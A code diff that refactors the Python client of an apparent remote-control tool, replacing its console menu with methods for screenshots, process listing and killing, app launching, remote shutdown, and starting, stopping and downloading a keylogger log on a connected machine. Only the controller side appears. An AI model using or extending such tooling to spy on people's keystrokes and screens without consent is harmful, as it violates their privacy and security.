@@ -30,82 +30,51 @@ TMP_PATH = os.path.join(os.getcwd(), 'tmp')
 
 class Client:
   def __init__(self):
-    self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     self.host = ''
     self.port = 0
     self.addr = (self.host, self.port)
+    self.is_connected = False
 
-  def connect(self):
-    self.host = input('Enter host: ')
-    self.port = int(input('Enter port: '))
-    self.addr = (self.host, self.port)
-    is_disconnected = True
-    print("[CONNECTING] Connecting to server...")
-    start_time = time.time()
-    while is_disconnected:
-      if time.time() - start_time > 10:
-        print("[ERROR] Connection timeout")
-        exit()
-      try:
-          self.socket.connect(self.addr)
-          # self.client.settimeout(None)
-          is_disconnected = False
-          print("[SUCCESS] Connected to server") 
-      except ConnectionRefusedError:
-          pass
-      except ConnectionAbortedError:
-          pass
-      except ConnectionResetError:
-          pass
+  def connect(self, host, port):
+    try:
+      if not self.is_connected:
+        if host == '' or port == '' or not port.isdigit():
+          return "[ERROR] Host or port is empty/invalid"  
 
-  # Command Line Interface
-  def run(self):
-    while True:
-      print('''Commands:
-      1: Take screenshot
-      2: View processes
-      3: View apps
-      4: Kill process/app
-      5: Start app
-      6: Start process
-      7: Start key logger
-      8: Stop key logger
-      9: Print key logger
-      10: Shutdown
-      0: Exit''')
-      cmd = input('Enter command: ')
-    
-      try:
-        if cmd == '1':
-          self.take_screenshot()
-          self.save_file(TMP_PATH, 'screenshot.png')
-        elif cmd == '2':
-          self.view_processes()
-        elif cmd == '3':
-          self.view_apps()
-        elif cmd == '4':
-          pid = input('Enter pid: ')
-          self.kill_process(pid)
-        elif cmd == '5':
-          app_name = input('Enter app name: ')
-          self.start_app(app_name)
-        elif cmd == '6':
-          pass
-        elif cmd == '7':
-          self.start_keylogger()
-        elif cmd == '8':
-          self.stop_keylogger()
-        elif cmd == '9':
-          self.save_keylogger()
-        elif cmd == '10':
-          self.shutdown()
-          break
-        elif cmd == '0':
-          print("[EXIT] Exiting...")
-          break
-      except ConnectionResetError:
-        print("[ERROR] Connection reset")
-        exit()
+        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.socket.settimeout(4)
+        self.host = host
+        self.port = int(port)
+        self.addr = (self.host, self.port)
+        self.socket.connect(self.addr)
+            # self.client.settimeout(None)
+        self.is_connected = True
+        print("[SUCCESS] Connected to server") 
+        return "[SUCCESS] Connected to server"
+      else:
+        print("[ERROR] Already connected to server")
+        return "[ERROR] Already connected to server"
+    except socket.timeout:
+      print("[ERROR] Connection timeout")
+      return "[ERROR] Connection timeout"
+    except Exception as e:
+      print(e)
+      return e
+
+  def end_connection(self):
+    try:
+      if self.is_connected:
+        self.socket.send(CMD_END_CONNECTION.encode())
+        self.socket.close()
+        self.is_connected = False
+        print("[SUCCESS] Disconnected from server")
+        return "[SUCCESS] Disconnected from server"
+      else:
+        print("[ERROR] Not connected to server")
+        return "[ERROR] Not connected to server"
+    except Exception as e:
+      print(e)
+      return e
 
   def save_file(self, path, file_name, mode):
     start_time = time.time()
@@ -131,58 +100,135 @@ class Client:
     return msg
 
   def shutdown(self):
-    self.socket.send(CMD_SHUTDOWN.encode())
-    print("[SHUTDOWN] Disconnected from server")
+    try:
+      if self.is_connected:
+        self.socket.send(CMD_SHUTDOWN.encode())
+        self.socket.close()
+        self.is_connected = False
+        print("[SUCCESS] Disconnected from server")
+        return "[SUCCESS] Disconnected from server"
+      else:
+        print("[ERROR] Not connected to server")
+        return "[ERROR] Not connected to server"
+    except Exception as e:
+      print(e)
+      return e
 
   def take_screenshot(self):
-    self.socket.send(CMD_TAKE_SCREENSHOT.encode())
-    self.save_file(TMP_PATH, 'screenshot.png', 'wb')
-    os.startfile(os.path.join(TMP_PATH, 'screenshot.png'))
+    try:
+      if self.is_connected:
+        self.socket.send(CMD_TAKE_SCREENSHOT.encode())
+        self.save_file(TMP_PATH, 'screenshot.png', 'wb')
+        os.startfile(os.path.join(TMP_PATH, 'screenshot.png'))
+        print("[SUCCESS] Screenshot saved")
+        return "[SUCCESS] Screenshot saved"
+      else:
+        print("[ERROR] Not connected to server")
+        return "[ERROR] Not connected to server"
+    except Exception as e:
+      print(e)
+      return e
 
   def start_keylogger(self):
-    self.socket.send(CMD_START_KEYLOGGER.encode())
-    msg = self.recv_msg(FLAG_MSG_END)
-    return msg
+    try:
+      if self.is_connected:
+        self.socket.send(CMD_START_KEYLOGGER.encode())
+        msg = self.recv_msg(FLAG_MSG_END)
+        return msg
+      else:
+        print("[ERROR] Not connected to server")
+        return "[ERROR] Not connected to server"
+    except Exception as e:
+      print(e)
+      return e
 
   def stop_keylogger(self):
-    self.socket.send(CMD_STOP_KEYLOGGER.encode())
-    msg = self.recv_msg(FLAG_MSG_END)
-    return msg
+    try:
+      if self.is_connected:
+        self.socket.send(CMD_STOP_KEYLOGGER.encode())
+        msg = self.recv_msg(FLAG_MSG_END)
+        return msg
+      else:
+        print("[ERROR] Not connected to server")
+        return "[ERROR] Not connected to server"
+    except Exception as e:
+      print(e)
+      return e
 
   def save_keylogger(self):
-    self.socket.send(CMD_PRINT_KEYLOGGER.encode())
-    self.save_file(TMP_PATH, 'keylogger.txt', 'wb')
+    try:
+      if not self.is_connected:
+        os.startfile(os.path.join(TMP_PATH, 'keylogger.txt'))
+      else:
+        self.socket.send(CMD_PRINT_KEYLOGGER.encode())
+        self.save_file(TMP_PATH, 'keylogger.txt', 'wb')
+        os.startfile(os.path.join(TMP_PATH, 'keylogger.txt'))
+        print("[SUCCESS] Keylogger saved")
+        return "[SUCCESS] Keylogger saved"
+    except FileNotFoundError:
+      print("[ERROR] Log file not found, please start keylogger and then save it")
+      return "[ERROR] Log file not found, please start keylogger and then save it"
+    except Exception as e:
+      print(e)
+      return e
     
   def view_processes(self):
-    self.socket.send(CMD_VIEW_PROCESSES.encode())
-    processes = self.recv_msg(FLAG_PROCESSES_END)
-    return processes
+    try:
+      if self.is_connected:
+        self.socket.send(CMD_VIEW_PROCESSES.encode())
+        processes = self.recv_msg(FLAG_PROCESSES_END)
+        return processes
+      else:
+        print("[ERROR] Not connected to server")
+        return "[ERROR] Not connected to server"
+    except Exception as e:
+      print(e)
+      return e
       
   def view_apps(self):
-    self.socket.send(CMD_VIEW_APPS.encode())
-    apps = self.recv_msg(FLAG_APPS_END)
-    return apps
+    try:
+      if self.is_connected:
+        self.socket.send(CMD_VIEW_APPS.encode())
+        apps = self.recv_msg(FLAG_APPS_END)
+        return apps
+      else:
+        print("[ERROR] Not connected to server")
+        return "[ERROR] Not connected to server"
+    except Exception as e:
+      print(e)
+      return e
 
   def kill_process(self, pid):
-    if (not pid or not pid.isdigit()):
-      print("[ERROR] PID is empty/invalid")
-      return "PID is empty/invalid"
-    self.socket.send(CMD_KILL_PROCESS.encode())
-    time.sleep(0.01)
-    self.socket.send(str(pid).encode())
-    return "Process/App killed"
+    try:
+      if self.is_connected:
+        if (not pid or not pid.isdigit()):
+          print("[ERROR] PID is empty/invalid")
+          return "[ERROR] PID is empty/invalid"
+        self.socket.send(CMD_KILL_PROCESS.encode())
+        time.sleep(0.01)
+        self.socket.send(str(pid).encode())
+        return "[SUCCESS] Process/App killed"
+      else:
+        print("[ERROR] Not connected to server")
+        return "[ERROR] Not connected to server"
+    except Exception as e:
+      print(e)
+      return e
 
   def start_app(self, app_name):
-    if (not app_name):
-      print("[ERROR] App name is empty")
-      return "[ERROR] App name is empty"
-    self.socket.send(CMD_START_APP.encode())
-    time.sleep(0.01)
-    self.socket.send(app_name.encode())
-    msg = self.recv_msg(FLAG_MSG_END)
-    return msg
-
-  def end_connection(self):
-    self.socket.send(CMD_END_CONNECTION.encode())
-
-  
+    try:
+      if self.is_connected:
+        if (not app_name):
+          print("[ERROR] App name is empty")
+          return "[ERROR] App name is empty"
+        self.socket.send(CMD_START_APP.encode())
+        time.sleep(0.01)
+        self.socket.send(app_name.encode())
+        msg = self.recv_msg(FLAG_MSG_END)
+        return msg
+      else:
+        print("[ERROR] Not connected to server")
+        return "[ERROR] Not connected to server"
+    except Exception as e:
+      print(e)
+      return e
